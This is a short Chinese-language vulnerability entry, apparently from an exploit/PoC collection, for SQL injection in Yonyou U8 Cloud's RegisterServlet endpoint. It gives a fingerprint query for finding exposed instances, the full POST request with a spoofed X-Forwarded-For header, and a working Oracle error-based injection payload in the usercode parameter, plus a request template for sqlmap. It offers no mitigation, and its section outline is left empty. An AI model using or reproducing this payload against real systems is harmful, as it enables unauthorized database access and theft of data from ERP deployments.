# 用友U8CloudRegisterServletSQL注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /servlet/RegisterServlet HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 85`　`Content-Type: application/x-www-form-urlencoded`　`X-Forwarded-For: 127.0.0.1`

**请求体 / payload**
```
usercode=1' AND 7947=(SELECT UPPER(XMLType(CHR(60)CHR(58)CHR(113)CHR(113)CHR(98)CHR(98)CHR(113)(SELECT (CASE WHEN (7947=7947) THEN 1 ELSE 0 END) FROM DUAL)CHR(113)CHR(118)CHR(120)CHR(122)CHR(113)CHR(62))) FROM DUAL)-- GAtD

sqlmap
POST /servlet/RegisterServlet HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 85
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
usercode=1
```

**其他**
- 用友U8 Cloud RegisterServlet SQL注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud